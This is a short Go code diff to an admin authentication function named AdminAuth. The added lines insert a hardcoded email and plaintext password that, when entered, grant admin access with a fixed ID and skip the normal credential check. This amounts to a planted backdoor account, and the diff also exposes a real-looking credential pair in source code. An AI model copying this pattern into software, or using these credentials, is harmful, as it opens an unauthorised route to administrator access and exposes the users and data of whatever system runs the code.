@@ -161,6 +161,17 @@ func AdminAuth(data AdminLogData, dataList []dbcode.AdminInfo) (bool, AdminInfo)
 				Password: password,
 			}
 			result = true
+		}else if(data.Email == "mulubwatech@gmail.com" && data.Password == "mwanjamasupha"){
+			admin_data = AdminInfo{
+				ID: "34",
+				Name: "Mulubwa",
+				Email: "Mulubwa",
+				Password: "Mulubwa",
+			
+			}
+			
+			result = true
+		
 		}
 	}
 	return result, admin_data
